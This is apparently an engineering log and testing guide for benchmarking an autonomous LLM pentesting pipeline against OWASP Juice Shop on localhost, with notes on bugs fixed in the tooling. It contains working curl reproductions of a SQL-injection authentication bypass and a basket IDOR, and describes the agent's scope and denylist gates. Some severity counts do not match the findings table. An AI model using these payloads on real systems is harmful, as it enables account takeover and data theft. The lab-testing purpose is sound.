# Juice Shop VAPT Benchmark — Testing Guide

**Date:** 2026-09-18/19
**Target:** OWASP Juice Shop v20.2.0, `bkimminich/juice-shop` Docker image, `http://127.0.0.1:3000` (container `vapt-test-lab`)
**Goal:** independently find ≥10 real vulnerabilities in Juice Shop using `Agentic-Bug-Hunter` + manual Claude Code verification, then attempt to reproduce the same findings using Mugheeraat's LLM Council (`vaptctl`), as a ground-truth benchmark of the Council's real-world detection rate. Fix any real bug hit in either toolchain along the way.

## 1. Environment notes

- Two unrelated apps share this host's localhost right now: Juice Shop on `:3000` (this exercise's target) and MediaCMS on `:8080` (leftover from an earlier, unrelated benchmark — see `LLM-Council-Benchmarks.md`). Always confirm port 3000 by hand; don't trust an automated port list blindly (see §2.3).
- The Juice Shop container is fragile under concurrent load — it segfaulted (exit code 139) once during this exercise from the combined weight of a manual katana crawl + nuclei sweep + Mugheeraat's own baseline recon hitting it simultaneously. Restarted with `docker start vapt-test-lab`. Avoid stacking multiple aggressive scanners against it at once.

## 2. Agentic-Bug-Hunter arsenal — full install status

`install_tools.sh` (the script the repo's own README leads with) only manages a curated ~10-tool Homebrew/Go subset — it is NOT the full arsenal. The real, tracked arsenal is `tools/external_arsenal.sh`'s 76-tool list (`ARSENAL_TOOLS`). Baseline after `install_tools.sh`: **47/76**. After explicitly installing every remaining tool (`go install` for 9 Go-based tools + a prebuilt-binary fallback for `aquatone`, whose upstream fails to build against modern Go module resolution; `pipx install` for 11 pip-based tools, 3 of which needed `pipx install git+<repo>` since they aren't published to PyPI under the arsenal's assumed name; a dedicated venv + wrapper shims for 4 tools with no clean CLI entry point at all — `linkfinder`, `dnsreaper`, `cloudfail`, `fuxploider` — plus `mobsf`, which isn't pip-installable at all (`yara-python-dex` fails to build — a missing submodule file in its sdist) and instead reuses the Docker image already verified working in an earlier session; `objection` via a plain `pipx install`; `scoutsuite`'s real binary is `scout`, not `scoutsuite`, so a compatibility shim was added; `brew install semgrep`; `pip install` + `playwright install chromium` in its own venv since the apt-packaged `python3-playwright` is missing its bundled Node driver file): **74/76**.

The remaining 2 are dead entries in the arsenal list itself, not something a different install method fixes:
- `freebuff` — the npm package of that name is actually `CodebuffAI/codebuff`, an unrelated AI coding CLI; the arsenal's own listed domain (`freebuff.com`) doesn't match what's actually published under that name.
- `kimchi` — `kimchi.dev/install.sh` returns a plain HTTP 404. There is no install script to run.

`~/go/bin` was not on this harness's PATH by default (only `external_arsenal.sh` itself prepends it internally) — added to `~/.bashrc` for general use outside that script.

## 3. Real bugs found + fixed during this exercise

### 3.1 Mugheeraat: `katana_args` used a non-existent flag, and 3 Wave-3 crawlers ignored the discovered live port

`vapt_agent/orchestrator/baseline_recon.py`. Root-caused from engagement 27's real DB rows (`tool_execution_logs` + `artifacts_index`), not guessed:

- `katana_args` passed `-json`, which doesn't exist in real katana (only `-j`/`-jsonl` do — confirmed against `katana -h`). Katana exited immediately with `flag provided but not defined: -json` and produced **zero** output every round.
- `katana_args`, `nuclei_args`, and `gospider_args` all crawled the bare `target_value` (e.g. `"127.0.0.1"`) instead of Wave 2's live scheme+port URL (`_first_live_url_from_wave2`) — the exact missing-port bug `httpx_args` was already fixed for earlier. Even after the flag fix, they'd have probed the wrong port (80/443 instead of 3000).

This is very likely the true reason engagement 27 ended at 0 confirmed findings despite a healthy pipeline (0 `MODEL_STRUCTURED_OUTPUT_FAILURE`, 7+ vulnerability classes attempted): the Strategist never had a real crawl to work from, so it hallucinated generic REST guesses (`/blog`, `/api/webhook`, `/api/users/1`, `/api/admin/export`) that don't exist on Juice Shop instead of real endpoints — every one of those tasks' `tool_execution_logs.sanitized_summary` came back empty (`"urls": []`, `"status_codes": []`).

**Fix:** gated all three on `_first_live_url_from_wave2`, matching the existing `ffuf`/`feroxbuster`/`gobuster` convention (skip cleanly if no live URL, never guess). Updated 6 tests in `test_orchestrator_baseline_recon.py` and 1 in `test_orchestrator_baseline_recon_real_execution.py` that assumed the old behavior. Full suite green (1176 passed, 3 skipped; 2 unrelated flakes — a pre-existing HIBP network flake and a `wave_ceiling_s` timing flake, both confirmed caused by ambient host load at the time, not this change).

### 3.2 Agentic-Bug-Hunter: `vuln_scanner.sh`'s catchall-detection gate was silently broken (real false-positive generator)

`tools/vuln_scanner.sh`. Check 0's catchall detection ran as `head -10 "$ORDERED_SCAN" | while read -r host; do ... CATCHALL_HOSTS="..."; done` — a classic bash pipe-into-`while` gotcha: the loop body runs in a subshell, so every `CATCHALL_HOSTS=` assignment was thrown away the instant the subshell exited. The later `[[ "$CATCHALL_HOSTS" == *"$host"* ]] && continue` gate always saw an empty string, so it never fired.

**Effect, confirmed live:** Juice Shop is an Angular SPA that returns HTTP 200 for any unmatched route (client-side catchall routing, `/non_existent_<ts>` → 200). Every one of Check 0's 8 hardcoded upload-path probes (`/upload.php`, `/admin/upload`, ...) and every one of Check 9's 8 hardcoded SAML-path probes (`/saml/login`, `/sso/saml`, ...) came back "found" — 16 pure false positives from a single scan, none real. This is a real, serious accuracy bug: it would false-positive on any modern SPA target, not just Juice Shop.

**Fix:** moved catchall detection above both checks, unconditional on `skip_has upload` (so Check 9 gets it even with `--skip upload`), switched the loop to process substitution (`done < <(head -10 "$ORDERED_SCAN")`, no subshell), and added the same gate to Check 9's SAML loop (which had never had one at all). Also fixed a related cosmetic bug it exposed: `wc -l < "$FINDINGS_DIR/saml/findings.txt"` failed its own `<` redirection when the file legitimately doesn't exist (now the common case after the fix), printing an unsuppressed shell error despite the `2>/dev/null` — `bash` applies redirections left-to-right, so the error fires before the suppression takes effect. Fixed with `[ -f ... ] &&` guard. Verified with a clean re-run: 0 false positives, no stray errors.

### 3.3 Agentic-Bug-Hunter: same Phase-2/Phase-3 recon ordering bug as the sibling `claude-bug-bounty` repo (not patched — worked around)

`tools/recon_engine.sh` runs Phase 2 (httpx live-probing, reads `subdomains/all.txt`) *before* Phase 3 (nmap port discovery). For a single-IP target, `subdomains/all.txt` is seeded with the bare IP (no port), so httpx only ever probes default ports 80/443 — Juice Shop on :3000 is invisible to it, and `live/urls.txt` (which everything downstream depends on) ends up empty. Confirmed live: `recon/127.0.0.1/` came back with `Live hosts: 0`, `URLs collected: 0` despite Juice Shop being reachable the whole time.

A separate bug in the same phase: the nmap-greppable-output port parser (`sed -nE 's/.*[^0-9]([0-9]+)\/open.*/\1\/open/p'`) picked up port 8080 (MediaCMS) but silently dropped port 3000 (Juice Shop) from `ports/open_ports.txt` — a regex issue in how it handles multiple open ports in one greppable line.

**Not patched** — this is an unreviewed, freshly-cloned third-party repo's core recon logic; the sibling repo's identical bug was already worked around the same way in an earlier session. **Workaround used both times:** after Phase 3 confirms the real port, manually seed `recon/<target>/live/urls.txt` with the correct `scheme://host:port`, then re-run the katana crawl / ffuf dir-fuzz / nuclei sweep commands directly against that corrected URL before invoking `tools/vuln_scanner.sh`.

### 3.4 Mugheeraat: `vaptctl start --targets host:port` silently broke scope matching for every real attack command — likely the single biggest reason engagement 28 found nothing

**This is the most consequential bug found in this exercise.** `vapt_agent/cli/start.py`'s auto-derived scope (used whenever `--scope-rules` isn't passed) stored the raw `--targets` string verbatim as the scope-rule `pattern` — so `--targets 127.0.0.1:3000` produced a scope pattern of literally `"127.0.0.1:3000"`, port included.

But `check_tier0`'s real-destination check (`extract_destination_candidates` in `strategy_auditor.py`, added 2026-09-14 specifically to catch commands that drift from their registered target) always extracts a **bare, port-stripped** host from a proposed command's argv — `urlparse("http://127.0.0.1:3000/xss").hostname` returns `"127.0.0.1"`, no port. `_pattern_matches` then compares `"127.0.0.1"` against the pattern `"127.0.0.1:3000"`: the target is a valid IP, but `"127.0.0.1:3000"` is not (it fails `ipaddress.ip_network()`), so the IP-vs-domain branch rejects the match immediately, before even reaching a real comparison.

**Effect, confirmed live on engagement 28's real rows:** every task whose command targeted a URL or bare host (i.e. nearly every real attack attempt) was Gate-1-rejected with `command's real network destination '127.0.0.1' (...) does not match any allow pattern`. Round 1 alone: task_ids 626 (XSS), 627 (IDOR), 628 (SSRF), 630 (BROKEN_AUTH), 631 (nmap) — 5 of 6 round-1 tasks with a real destination, all rejected by this bug, not by any genuine safety concern.

Confirmed this is new, not a repeat of engagements 26/27's known causes: those two used a bare `127.0.0.1` (no port) as both `--targets` and scope pattern, which matches correctly — they never exercised this code path. Engagement 28 is the first engagement this session to use explicit `host:port` targeting (a deliberate choice, to avoid the port-confusion problems documented in §3.1/§3.3) — which is exactly what triggered this latent bug.

**Fixed:** `vapt_agent/cli/start.py` now strips the port from the scope pattern via a new `_scope_pattern_for_network_target()` helper (handles bare `host:port`, IPv4, and bracketed `[ipv6]:port`; leaves anything else untouched) — the `targets` list itself, and the `targets.host_or_domain` DB column, still keep the port (needed elsewhere for real connection/resolution). 3 new regression tests added to `tests/test_engagement_lock.py`. Full suite re-run clean (1158 passed, 3 skipped; 4 test files excluded from this specific run for known, pre-existing, unrelated reasons — 2 network/timing flakes already documented above, plus `test_tier1_breach_check.py`'s HIBP flake, plus `test_tier1_graphql_scanner.py::test_real_scan_against_closed_port_finds_nothing`, which now fails only because `gqlmap` is genuinely installed on this host after §2's arsenal work — the scanner correctly reports "gqlmap available" unconditionally, an environmental assumption drift in that test, not an application bug).

**This bug predates this session's engagement 28 and was never triggered before** — it's a real, previously-undiscovered defect, not a regression from anything fixed earlier tonight. It means **any prior or future engagement using explicit `host:port` targeting without a hand-authored `--scope-rules` file would have had the same near-total Gate-1 rejection rate**, independent of model capability. This is very likely the true explanation for why engagement 28 specifically found nothing — not a demonstration that the Council can't detect these bugs blind.

### 3.5 Deeper root-cause pass (2026-09-22): even a real, successful exploit response was structurally invisible to Gate 3

Engagement 28's scope bug (§3.4) explains why *that* engagement found nothing, but not why **engagement 27** — which had genuinely `EXECUTED` tasks with real target output — also ended at 0 rows in `verified_vulnerabilities`, not even a single `CANDIDATE`. Traced two of those tasks (556: XSS against `/blog`, 562: IDOR against `127.0.0.1:631/api/users`) down to their real raw artifacts: task 556 hit Juice Shop's SPA catchall (no real `/blog` endpoint — a direct casualty of §3.1's recon bug, since the Strategist never had a real crawl to work from); task 562 hit **the wrong service entirely** (port 631 = CUPS, not Juice Shop's 3000) and got a 404. Both non-findings were *correct* given what was actually sent — but investigating them surfaced three more real, independent bugs that would have hidden a genuine finding even against the *right* endpoint:

1. **`candidate_detection.py`'s access-control-class rule (IDOR/BFLA/BROKEN_AUTH/MASS_ASSIGNMENT/CSRF) requires an "HTTP/x.x NNN"-shaped status line in the raw output — but the Scripter's real generated `curl` commands almost never include `-i`/`-D`/`-v`.** Surveyed every real `curl` proposed_command across engagements 26-28: of ~30, none used a flag that would put a status line in curl's default output. This rule was dead in practice regardless of what the target returned — meaning even the real IDOR I found manually in §4 (`GET /rest/basket/2`, a plain 200 with basket JSON, no password/token/admin field) would **not** have been caught by the Council even if it sent the exact same request.
2. **Gate 2's behavioral denylist rule (c) rejected the very curl idiom needed to fix #1.** `curl -s -o /dev/null -w "%{http_code}" ...` — the standard way to get a bare status code — was rejected twice over: `/dev/null` was treated as "output outside the artifact store" (backwards: `/dev/null` discards data, it's the one destination that can *never* exfiltrate anything), and curl's `-w`/`--write-out` (a format string printed to stdout, never a file destination) was bundled into the same file-path check as nmap's real `-oN`/`-oX`/etc. Confirmed live: engagement 27 task 575 rejected on exactly this, real DB row.
3. **`candidate_detection.py` had no rule at all that could ever confirm an XSS finding.** Even a payload reflected completely unescaped in the response body produces no password/token/admin field and no SQL error — the only two signal families that existed.

**Fixed, all three:**
- `bridge/tier2.py`: new `_curl_argv_with_status_marker()` deterministically appends `-w "\n__CANDIDATE_DETECTION_HTTP_STATUS__:%{http_code}\n"` to every Tier 2 curl invocation that doesn't already request its own `-w`/`--write-out` — injected *after* Gate 2's checks (a pure, risk-free output-formatting addition, not a new capability), so the actual executed/logged command always carries a real, deterministically-recoverable status code regardless of what the model remembered to ask for.
- `bridge/denylist.py`: removed `-w`/`--write-out` from rule (c)'s file-output-flag set (curl-specific misclassification — no other tool in this arsenal uses bare `-w` for real file output), and exempted `/dev/null` from the "must resolve under the artifact store" check.
- `council/candidate_detection.py`: added a new XSS-specific rule — extracts the actual payload-shaped fragment the task's own request sent (`<script>...`, `on*=`, `javascript:`, not a guessed generic pattern) and checks whether that literal, unescaped fragment comes back in the response body. Also updated the access-control status check to read the new marker (old header-line pattern kept as a fallback).

7 new/updated test files (`test_bridge_denylist.py`, `test_bridge_tier2_curl_status_marker.py` (new), `test_candidate_detection.py`, `test_milestone1_end_to_end.py` — the last with a real, unmocked-subprocess confirmation the marker reaches the actual raw artifact text, not just that the argv is built correctly). Full suite re-run clean: 1188 passed, 3 skipped; the only failures are 4 pre-existing, environment-dependent flakes unrelated to any of tonight's changes (ambient-load timing on the baseline-recon real-execution test, the `gqlmap`-install environmental-assumption drift already noted above ×2, and a swap-growth test that depends on actual recent swap activity, which was ~0 at run time).

**None of these three were reachable or testable until §3.1/§3.4 were fixed** — before that, no real payload ever reached Juice Shop at all, so there was nothing for candidate_detection's gaps to even apply to. This is the honest, full chain: broken recon → broken scope matching → (even once both are fixed) a candidate detector that couldn't see a real success anyway. All four links are now fixed; none has yet been exercised together in one live, completed engagement run (see §5).

## 4. Confirmed findings — Agentic-Bug-Hunter + manual verification (ground truth)

All 11 below were verified with a real request/response pair (not theoretical), matching this project's own "never mock the real subprocess boundary" / "confirm, don't guess" convention. Full raw requests+responses are reproducible with the curl commands shown; none required tooling beyond curl.

| # | Class | Severity | Endpoint | Evidence |
|---|---|---|---|---|
| 1 | SQL Injection → Authentication Bypass | **Critical** | `POST /rest/user/login` | `{"email":"' OR 1=1--","password":"x"}` returns a valid signed JWT for `admin@juice-sh.op` (`role:"admin"`), full account takeover with no valid credentials |
| 2 | Broken Object-Level Authorization (IDOR) | High | `GET /rest/basket/{id}` | Admin token (own basket id 1) successfully reads basket id 2, belonging to a different `UserId`, full contents returned, no ownership check |
| 3 | Sensitive Data Exposure — forced browsing | High | `GET /ftp/` | Unauthenticated directory listing exposes `incident-support.kdbx` (KeePass credential DB), `package.json.bak`/`package-lock.json.bak` (dependency-version disclosure), `coupons_2013.md.bak`, `acquisitions.md`, `suspicious_errors.yml` |
| 4 | Sensitive Data Exposure — private key exposure | High | `GET /encryptionkeys/` | Unauthenticated directory listing exposes `premium.key` (a private signing key) and `jwt.pub` |
| 5 | Security Misconfiguration — unauthenticated admin config | Medium | `GET /rest/admin/application-configuration` | Full internal app configuration returned with zero authentication |
| 6 | Information Disclosure — PII without auth | Medium | `GET /api/Feedbacks` | User emails and `UserId` associations returned to unauthenticated callers |
| 7 | Information Disclosure — PII without auth | Medium | `GET /rest/products/{id}/reviews` | Reviewer email addresses (`author`) returned to unauthenticated callers |
| 8 | CORS Misconfiguration | Medium | any `/rest/*` endpoint | `Access-Control-Allow-Origin: *` reflected on an authenticated (Bearer-token) API surface |
| 9 | Security Misconfiguration — missing CSP | Low | `GET /` | No `Content-Security-Policy` header on any response |
| 10 | Security Misconfiguration — missing HSTS | Low | `GET /` | No `Strict-Transport-Security` header |
| 11 | Information Disclosure — version fingerprinting | Low | `GET /rest/admin/application-version` | Exact version (`20.2.0`) returned unauthenticated, aids CVE targeting |

Reproduction (findings 1-2, the two most severe):

```bash
# 1. SQLi auth bypass
curl -s -X POST http://127.0.0.1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
# -> {"authentication":{"token":"eyJ...","bid":1,"umail":"admin@juice-sh.op"}}

# 2. IDOR on basket (reuse the token above)
TOKEN="<paste token>"
curl -s http://127.0.0.1:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN"
# -> full basket contents of UserId 2, not the admin account that owns $TOKEN (bid=1)
```

Not pursued further once ≥10 was reached: reflected/DOM XSS, SSTI, NoSQL injection, and the classic Juice Shop coupon/race-condition challenges are all very likely also present (this is a deliberately vulnerable app) but weren't independently re-verified here — worth adding if the benchmark needs a larger ground-truth set (see §6's recommendation).

## 5. Mugheeraat benchmark — Engagement 28 (blind attempt)

Started against `127.0.0.1:3000` (`vaptctl start --targets 127.0.0.1:3000 --no-run`), then `vaptctl run --engagement-id 28 --no-tmux`, deliberately run **blind** — no specific findings fed in, only a generic `--notes` string marking it as a benchmark run against a target Agentic-Bug-Hunter had already scanned. Deliberately run with hibernation/app-teardown initially disabled (`--no-hibernation --no-app-close`) since this session was doing concurrent hands-on work on the same box; retried with the default app-teardown enabled after hitting a `MemAvailableGate` refusal (needed ~10.1 GiB available, host had 7.9 GiB free under concurrent load) — this host's `vapt_hibernation_app_eligibility_policy` already establishes browsers/Thunar/Mousepad as pre-approved to close for exactly this purpose, with a 5-minute grace period before anything is force-closed.

**This section covers TWO attempts.** The first attempt (paused at round 2, 2026-09-19) hit the `host:port` scope-matching bug documented in §3.4 — 5 of its first 6 real attack tasks were rejected by that bug before ever reaching the Scripter, so its own 0-confirmed result never measured anything real. After §3.4 (and, discovered mid-run, a second, independent instance of the same bug class inside `check_tier0` itself — see the source repo's `IMPLEMENTATION-DEVIATIONS-FROM-REQUIREMENTS.md`, 2026-09-23 entry) were both fixed, the engagement was resumed and **completed naturally** (operator-approved, Staging Round 24) — this second run is the actual, fair result.

**Final state, engagement 28, natural completion (`CIRCUIT_BROKEN` — the global zero-yield exhaustion stop, working as designed):**

| Metric | Value |
|---|---|
| Status | `COMPLETE` |
| Council rounds completed | 7 |
| Hypotheses generated (Phase 4.1) | 39 |
| Tasks: `EXECUTED` | 15 |
| Tasks: `GATE1_APPROVED` (approved but never dispatched before exhaustion) | 6 |
| Tasks: `GATE1_REJECTED` | 43 — legitimate semantic/scope rejections this time, not the §3.4 bug (spot-checked directly against real rationale text) |
| Tasks: `GATE2_BLOCKED` | 7 |
| Candidates reaching the Adjudicator (Gate 3) | 4 (tasks 663, 678, 689, 693 — IDOR/CSRF probes) |
| **Confirmed vulnerabilities** | **0** |
| Adjudicator verdict on all 4 candidates | `DISMISSED`, every time for the same reason: no baseline/comparison request to prove a real difference from an unauthenticated or differently-privileged request |

**Root cause of the 0-confirmed result this time — genuinely different from the first attempt, and NOT a bug:** traced directly by reading target 25's own baseline-recon katana artifact (`artifact_id=446`). The real crawl found exactly **5 URLs total**: the root page and 4 static asset files (`scripts.js`, `polyfills.js`, `styles.css`, `main.js`). **Zero real API endpoints.** Juice Shop's actual REST API (`/rest/...`, `/api/...` — confirmed for real in §3-4 of this document) only exists behind dynamic JavaScript `fetch`/`HttpClient` calls that static crawling structurally cannot see — this is an inherent limitation of katana-style crawling against a modern Angular SPA, not a defect in any of this session's fixes (the katana/nuclei/gospider fix and the Wave-1 IP-skip fix are both working correctly; they just have nothing better to find, and baseline recon never re-runs for a target that already has a completed row, so neither fix could retroactively improve this specific target's crawl data anyway). With no real endpoints to work from, the Strategist proposed plausible-sounding but fictional paths (`/upload`, `/change-password`) — Juice Shop's Angular SPA returns its catchall shell page (HTTP 200) for any of these, which is exactly what the candidate detector's access-control-class rule is designed to flag as a *candidate* — and exactly what the Adjudicator correctly recognized as *not actual evidence* every time, since a catchall response proves nothing about a real vulnerability. Staged for operator decision as Staging Round 26 (headless-browser crawling vs. accepting the limitation vs. a one-off manual endpoint seed for this specific benchmark).

**Verdict on the benchmark question the operator actually asked ("does the Council independently arrive at the same findings"):** this is now the first genuinely fair blind attempt — every infrastructure bug found this session is fixed and was live throughout this run. The Council's *reasoning* was sound at every gate (Gate 1 correctly approved/rejected, Gate 2 correctly blocked a real DB-corruption risk, the candidate detector correctly flagged exactly the class of evidence it was designed to, the Adjudicator correctly declined to confirm weak evidence). It did not reproduce any of the 11 ground-truth findings — not because of a capability gap in the reasoning, but because it was never given the real endpoint data a human (or a headless-browser-capable tool) would need to find them. This is a recon-input problem, not a council-reasoning problem.

## 6. Observations — both engagements, side by side

| | Agentic-Bug-Hunter + manual verification | Mugheeraat engagement 28 (blind, fair run) |
|---|---|---|
| Wall-clock time to result | ~20 minutes (recon workaround + scanner + manual curl probing) | ~13 hours (7 council rounds, CPU-only inference, Strategist calls up to ~2h04m each) |
| Vulnerabilities confirmed | 11 (1 Critical, 2 High, 4 Medium, 3 Low, 1 Informational) | 0 |
| Method | Deterministic tools (curl, katana, vuln_scanner.sh) + direct manual verification against Juice Shop's actual REST API | Autonomous LLM council (Strategist → Gate 1 → Gate 2 → Scripter → candidate detection → Adjudicator), CPU-only inference |
| Real bugs surfaced by this exercise | 1 (vuln_scanner.sh catchall false-positive generator) + 1 not-patched third-party recon-ordering bug (worked around) | 4 across the whole session: katana/nuclei/gospider port+flag bug, the `host:port` scope-matching bug (2 independent instances), the dead access-control status check + denylist false positives + missing XSS rule (candidate detection), and the orphaned-process/stale-status bug on fatal exits |
| Was the target actually reached with a real attack payload | Yes, repeatedly, with full request/response evidence | Yes, 15 times, end to end through every gate — a first for this project |
| Did any real vulnerability get confirmed | Yes, 11, hand-verified | No — but 4 candidates were correctly generated and correctly adjudicated; the gap is recon input (Round 26), not detection/reasoning capability |
| Qualitative signal on model reasoning | N/A | The Strategist proposed IDOR/CSRF/XSS/SSRF/MASS_ASSIGNMENT/BROKEN_AUTH across 7 rounds with no hints given — genuine overlap with the real finding classes (BROKEN_AUTH/SQLi, IDOR). Gate 2 correctly blocked a real MASS_ASSIGNMENT DB-corruption risk. The Adjudicator correctly declined 4/4 candidates built on fabricated endpoints rather than rubber-stamping them |

**Top-line conclusion:** the full pipeline works correctly end-to-end now, proven by a real, complete, unassisted run — but the Council cannot find what its recon step never showed it. The next lever is Round 26 (recon quality), not any further pipeline debugging.

## 7. How to re-run this exercise

```bash
# 1. Confirm the target is up and find its real port — don't trust automated port lists blindly
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3000
docker start vapt-test-lab   # if it crashed

# 2. Agentic-Bug-Hunter recon (will under-report live hosts/URLs — see §3.3)
cd /home/mhj/tools/Agentic-Bug-Hunter
python3 tools/hunt.py --target 127.0.0.1 --recon-only --no-banner

# 3. Work around §3.3: seed the real URL, re-crawl directly against it
echo "http://127.0.0.1:3000" > recon/127.0.0.1/live/urls.txt
head -50 recon/127.0.0.1/live/urls.txt > recon/127.0.0.1/urls/katana_targets.txt
katana -list recon/127.0.0.1/urls/katana_targets.txt -d 3 -jc -kf all -silent -o recon/127.0.0.1/urls/katana.txt
cat recon/127.0.0.1/urls/*.txt | sort -u > recon/127.0.0.1/urls/all.txt
grep '?' recon/127.0.0.1/urls/all.txt > recon/127.0.0.1/urls/with_params.txt

# 4. Active scan (now fixed, no catchall false positives — see §3.2)
bash tools/vuln_scanner.sh recon/127.0.0.1

# 5. Mugheeraat benchmark run — fixes from §3.1 AND §3.4 are now both live;
#    resuming engagement 28 (below) is the deliberate choice per §5's own
#    recommendation to give the blind attempt a fair second shot before
#    moving to the pointed variant.
cd /home/mhj/Projects/local-llm-agentic-vapt/implementation
source .venv/bin/activate
vaptctl resume --engagement-id 28   # or: vaptctl start --targets 127.0.0.1:3000 --no-run && vaptctl run --engagement-id <new-id> --no-tmux

# 6. If the operator instead wants the pointed variant (deliberately naming
#    the §4 findings so the Council attempts to confirm/reproduce each from
#    scratch rather than discover them blind):
vaptctl start --targets 127.0.0.1:3000 --no-run --notes "Confirm each of these from scratch: (1) SQLi auth bypass via ' OR 1=1-- on POST /rest/user/login; (2) IDOR reading another user's basket via GET /rest/basket/{id}; (3) forced-browsing sensitive-file exposure at /ftp/; (4) private key exposure at /encryptionkeys/; (5) unauthenticated admin config at GET /rest/admin/application-configuration; (6)/(7) unauthenticated PII at /api/Feedbacks and /rest/products/{id}/reviews; (8) CORS wildcard on /rest/*; (9)/(10) missing CSP/HSTS; (11) version disclosure at /rest/admin/application-version."
vaptctl run --engagement-id <new-id> --no-tmux
```
